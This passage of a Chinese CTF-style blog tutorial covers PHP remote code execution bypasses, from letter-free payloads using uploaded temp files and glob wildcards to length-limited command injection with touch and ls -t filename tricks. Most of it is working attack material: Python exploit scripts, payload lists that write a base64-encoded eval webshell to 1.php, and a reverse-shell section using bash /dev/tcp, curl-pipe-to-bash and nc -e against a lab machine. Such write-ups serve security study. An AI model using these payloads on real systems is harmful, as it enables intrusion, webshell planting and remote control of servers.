title="PHP5+shell打破禁锢"></a>PHP5+shell打破禁锢</h5><p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、<code>$</code>的系统命令来getshell？</p><p>好像问题又回到了原点：无字母、数字、<code>$</code>，在shell中仍然是一个难题。</p><p>此时我想到了两个有趣的Linux shell知识点：</p><blockquote><ol><li>shell下可以利用<code>.</code>来执行任意脚本</li><li>Linux文件名支持用glob通配符代替</li></ol></blockquote><p><strong><code>.</code>或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则<code>. file</code>的意思就是用bash执行file文件中的命令。</strong></p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用<code>.</code>来执行它了吗？</p><p>这儿主要介绍<code>php.ini</code>中的两个参数</p><p><code>file_uploads</code> 是否允许上传<br><code>upload_tmp_dir</code> 是默认的临时文件的保存目录（linux默认为<code>/tmp</code>）</p><p>这个文件也很好得到，<strong>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</strong></p><p>第二个难题接踵而至，执行<code>. /tmp/phpXXXXXX</code>，也是有字母的。此时就可以用到Linux下的glob通配符：</p><blockquote><ul><li><code>*</code>可以代替0个及以上任意字符</li><li><code>?</code>可以代表1个任意字符</li></ul></blockquote><p>那么，<code>/tmp/phpXXXXXX</code>就可以表示为<code>/*/?????????</code>或<code>/???/?????????</code>。</p><p>但我们尝试执行<code>. /???/?????????</code>，却得到如下错误：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cda411d.png" alt="image-20240331121547675"></p><p>这是因为，能够匹配上<code>/???/?????????</code>这个通配符的文件有很多，我们可以列出来：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf110ee.png" alt="image-20240331121610564"></p><p>可见，我们要执行的<code>/tmp/phpcjggLC</code>排在倒数第二位。然而，在执行第一个匹配上的文件（即<code>/bin/run-parts</code>）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><h5 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h5><p>大部分同学对于通配符，可能知道的都只有<code>*</code>和<code>?</code>。但实际上，阅读<a href="http://man7.org/linux/man-pages/man7/glob.7.html">Linux的文档</a>，可以学到更多有趣的知识点。</p><p>其中，glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ccee8ff.png" alt="image-20240331121817617"></p><p>排除了第4个字符是<code>-</code>的文件，同样我们可以排除包含<code>.</code>的文件：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce44f0c.png" alt="image-20240331121926648"></p><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，发现另一个有趣的用法：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cd70c41.png" alt="image-20240331122049924"></p><p>就跟正则表达式类似，glob支持利用<code>[0-9]</code>来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf610fc.png" alt="image-20240331122112426"></p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p><img src="C:\Users\admin\Desktop\ascii.png" alt="ascii"></p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p><img src="https://bu.dusays.com/2024/05/13/664161ce62150.png" alt="image-20240331122316557"></p><p>显然这一招是管用的。</p><h5 id="构造POC-执行任意命令"><a href="#构造POC-执行任意命令" class="headerlink" title="构造POC 执行任意命令"></a>构造POC 执行任意命令</h5><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=</code>. &#x2F;???&#x2F;????????[@-[]<code>;?&gt;</code>，发送数据包如下：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cf6c79e.png" alt="image-20240331122439548"></p><p>成功执行任意命令。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除这些之外我们还可以这样用<code>$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code>其中<code>&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</code>为构造出的<code>_GET</code>，适合于过滤了引号的情况下使用。</p><h2 id="限制长度RCE"><a href="#限制长度RCE" class="headerlink" title="限制长度RCE"></a>限制长度RCE</h2><h3 id="15字符下可控"><a href="#15字符下可控" class="headerlink" title="15字符下可控"></a>15字符下可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])&lt;<span class="number">15</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为只能传入14个字符，但是没有限制命令执行的次数，所以我们的思想可以通过Linux下的&gt;符号与&gt;&gt;符号写入一段一句话木马到指定文件。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="variable">$_GET</span></span><br><span class="line">[<span class="number">1</span>]</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>经测试上述这样的一句话木马（经过换行）是可以命令执行的，所以我们可以通过传参构造出这样的一句话木马，不断传入以下Payload：</p><p><img src="https://bu.dusays.com/2024/05/13/664161cd8d4d6.png" alt="image-20240331192116873"></p><h3 id="7字符下可控"><a href="#7字符下可控" class="headerlink" title="7字符下可控"></a>7字符下可控</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]&lt;<span class="number">7</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- cat flag.php --&gt;</span><br><span class="line">替换：</span><br><span class="line">touch &quot;hp&quot;</span><br><span class="line">touch &quot;g.p\\&quot;</span><br><span class="line">touch &quot;la\\&quot;</span><br><span class="line">touch &quot;t f\\&quot;</span><br><span class="line">touch &quot;ca\\&quot;</span><br><span class="line">ls -t</span><br><span class="line">ls -t &gt;a 将 ls -t 内容写入到a文件中</span><br><span class="line">sh a</span><br><span class="line"></span><br><span class="line">\是指换行</span><br><span class="line">ls -t将文件按时间排序输出</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure><p>同理：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;和&gt;&gt;：</span><br><span class="line"></span><br><span class="line">&gt;b 类似于touch b，即直接创建文件b，通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容</span><br><span class="line"></span><br><span class="line">echo kuai &gt; a  #创建文件a，并把字符串&#x27;kuai&#x27;写入到文件a里</span><br><span class="line"></span><br><span class="line">&gt;&gt;用来追加内容</span><br><span class="line"></span><br><span class="line">kuai &gt;&gt;a   #在文件a末尾追加字符串&#x27;kuai&#x27;</span><br><span class="line"></span><br><span class="line">ls -t命令：按时间顺序，由近及远排序（后创建的排在前面，只能精确到秒）</span><br></pre></td></tr></table></figure><p>由此：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#&gt;ag</span><br><span class="line">#&gt;fl</span><br><span class="line">#&gt;&quot;t&quot;</span><br><span class="line">#&gt;ca</span><br><span class="line">#ls -t</span><br><span class="line">ca &#x27;t &#x27; fl ag</span><br></pre></td></tr></table></figure><p>按时间顺序反向依次创建文件，”ca” “‘t “ “fl” “ag”</p><p>再通过ls -t &gt; x，创建文件x，并把’Is -t执行结果写入文件x里 。</p><p>实际上在创建文件时，加入”&quot;，把命令”ca””t””f””ag”连接起来</p><blockquote><ul><li><p>“\” linux中可以用\使指令连接下一行，这样就可以写多行命令了。</p></li><li><p>文件中前面命令出错，会自动跳过，不影响后面命令的执行。</p></li><li><p>Shell 脚本的执行方式通常有如下<a href="https://blog.csdn.net/timchen525/article/details/76407735">三种</a>：</p></li></ul><p>​       bash script-name 或者 sh script-name；</p><p>​       path&#x2F;script-name或者.&#x2F;script-name；</p><p>​       sourcescript-name或者. script-name。</p><p>推荐用第一种 <code>bash file</code> <code>sh file</code> 第三种<code>. file </code>第二种要文件有执行权限故不推荐</p></blockquote><p>上面不是ls -t&gt;a 吗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat a     查看后发现都写进去了</span><br></pre></td></tr></table></figure><p>然后可以.a执行脚本</p><p>可以发现确实符合第四条 文件中前面命令出错，会自动跳过，不影响后面命令的执行。</p><p>可以发现最长的长度就是 <code>ls -t&gt;0</code> 7了</p><p>上点难度假如要执行 <code>echo Y2F0IC9mbGFn|base64 -d&gt;1</code> 怎么办？(Y2F0IC9mbGFn -&gt; cat &#x2F;flag)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入语句</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">#base64编码后</span></span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"><span class="comment">#需要被执行的语句：</span></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>payload.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://172.19.14.20:27444/index.php?rce=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://172.19.14.20:27444/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>攻击完成后就会生成1.php文件</p><p><strong>注：</strong>这里用的是&lt;?php eval($_GET[1]); 不是一句话木马，不能用蚁剑链接(可能改成POST就行了，不过没有尝试)</p><p>命令里的空格，&gt; ，| ，或者其他特殊字符一定要转义。</p><h3 id="5字符下可控"><a href="#5字符下可控" class="headerlink" title="5字符下可控"></a>5字符下可控</h3><p>与7字符下可控一样</p><p>主要思路是缩短 <code>ls -t&gt;0</code> 这一步骤的长度，把这条命令拆分到各个文件中去</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h4><p>拼接字符串写入一句话</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0【前面可以拆成更小的，ls -t&gt;0需要单独拆分出来】</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>ls -t &gt;0 拆分方法</p><p>同理：</p><ol><li><p>输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></li><li><p>通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出）</p></li><li><p>用dir来代替ls不换行输出；rev将文件内容反向输出；在用ls时，写到a时每个文件名都是单独一行</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;rev</span><br><span class="line">echo 1234 &gt; v</span><br><span class="line">*v （等同于命令：rev v）</span><br></pre></td></tr></table></figure><p>目的：echo${IFS}PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 ‐d&gt;1.php</p><p>那么我们只需要将上面的代码拆分倒序输入到主机即可。我们需要让sh先执行a文件（ls -th &gt;f）就会得到f文件，最后再让sh去执行f文件即可得到1.php。最终payload如下</p><p>payload.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\ </span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\ </span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.12.107/5/index.php?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        <span class="comment">#检查是 否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.12.107/5/sandbox/2ad26c4b0f3cdead3c4c1955ad805b8d/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后蚁剑连接即可（1.php）</p><h4 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h4><p>反弹shell</p><p>既然可以执行命令，那么我们首先想到的是反弹一个shell回来</p><blockquote><p>我们在自己的vps上web目录&#x2F;var&#x2F;www&#x2F;html&#x2F;里先创建一个文件index.html，里面写好反弹shell的话（由于linux文件名不能有斜杠“&#x2F;”，所以就不能curl xxx.xxx.xxx.xxx&#x2F;1.txt，我们就用index，这样47.1x0.1x0.123连上后会默认自动访问index.html反弹shell）</p></blockquote><p>bash反弹shell的命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>空格需要转义</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure><p>构造空格就用去了五个字符，我们的语句里面有两个空格，而相同的文件名只能有一个，因此这里不能直接执行bash反弹shell<br>那么通过将反弹语句放在vps上，然后通过如下方式来执行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ip地址|bash</span><br></pre></td></tr></table></figure><p>我们先在自己的vps新建一个文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/120.79.33.253/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>然后在vps上面监听7777端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lv 7777</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161cd8fbd6.png" alt="image-20240401084203278"></p><p>因为ls -t&gt;_的长度也大于5，所以要要把ls -t&gt;y写入文件</p><p>ls命令排序的规则是空格和符号最前，数字其次，字母最后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;ls\\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161ce76530.png" alt="image-20240401084253212"></p><p>那么我们再构造curl 120.79.33.253|bash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;53\\</span><br><span class="line">&gt;2\\</span><br><span class="line">&gt;3.\\</span><br><span class="line">&gt;3\\</span><br><span class="line">&gt;9.\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;0.\\</span><br><span class="line">&gt;12\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh _</span><br></pre></td></tr></table></figure><p>生成文件y<br>再执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh y</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">本脚本使用说明:</span></span><br><span class="line"><span class="string">    现有靶机:192.168.40.148  攻击机:192.168.40.146,两者均为kali</span></span><br><span class="line"><span class="string">    对于靶机:</span></span><br><span class="line"><span class="string">        搭建环境:</span></span><br><span class="line"><span class="string">        拉取镜像: docker pull mcc0624/cmd:latest</span></span><br><span class="line"><span class="string">        启动docker: sudo docker run -p 18022:22 -p 18080:80 -p 18081:81 -p 18082:82 -p 18085 -i -t mcc0624/cmd:latest bash -c &#x27;/etc/rc.local; /bin/bash&#x27;</span></span><br><span class="line"><span class="string">        退出并关闭docker:exit</span></span><br><span class="line"><span class="string">    对于攻击机: 开三个终端,分别执行:</span></span><br><span class="line"><span class="string">        nc -lvp 7777</span></span><br><span class="line"><span class="string">        vim 一个index.html文件,写入 nc 192.168.40.146 7777 -e /bin/bash 或执行命令: echo &quot;nc 192.168.40.146 7777 -e /bin/bash&quot; &gt; index.html</span></span><br><span class="line"><span class="string">        开启HTTP服务: python -m http.server 80</span></span><br><span class="line"><span class="string">        (第二,第三个命令需要在同一个目录下执行)</span></span><br><span class="line"><span class="string">    温馨提示:</span></span><br><span class="line"><span class="string">        根据情况修改变量baseurl的值</span></span><br><span class="line"><span class="string">        根据情况修改list2中的IP</span></span><br><span class="line"><span class="string">        在执行该脚本的时候,可通过进入靶机内部对应的题目目录下不断地执行ls命令,来看传值的情况</span></span><br><span class="line"><span class="string">        最终的结果应是21秒左右能反弹成功</span></span><br><span class="line"><span class="string">        不能反弹成功时尝试查看脚本是否有问题</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">baseurl = <span class="string">&quot;http://192.168.40.148:18080/class09/3/index.php?cmd=&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将ls -t 写入文件_</span></span><br><span class="line"><span class="built_in">list</span>=[</span><br><span class="line">    <span class="string">&quot;&gt;ls\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;-t\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\&gt;y&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ls&gt;&gt;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据自己情况更改ip curl 192.168.40.146|bash</span></span><br><span class="line">list2=[</span><br><span class="line">    <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\/\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;6\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;14\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;0.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;4\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;8.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;16\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;2.\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;19\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;rl\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh _&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在攻击机上:</span></span><br><span class="line"><span class="string">开三个页面,分别执行:</span></span><br><span class="line"><span class="string">nc -lvp </span></span><br><span class="line"><span class="string">python -m http.server 80</span></span><br><span class="line"><span class="string">echo &quot;192.168.40.146&quot; &gt; index.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后开始运行此python文件</span></span><br><span class="line"><span class="string">大概等21秒,成功反弹到攻击机</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="4字符下可控"><a href="#4字符下可控" class="headerlink" title="4字符下可控"></a>4字符下可控</h3><h4 id="法1-2"><a href="#法1-2" class="headerlink" title="法1"></a>法1</h4><p>常规：字符拼接写马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span 